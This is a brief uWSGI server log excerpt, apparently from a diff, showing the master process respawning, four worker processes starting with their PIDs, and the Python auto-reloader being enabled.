+gracefully (RE)spawned uWSGI master process (pid: 1335)
+spawned uWSGI worker 1 (pid: 21108, cores: 2)
+spawned uWSGI worker 2 (pid: 21109, cores: 2)
+spawned uWSGI worker 3 (pid: 21110, cores: 2)
+spawned uWSGI worker 4 (pid: 21111, cores: 2)
+Python auto-reloader enabled
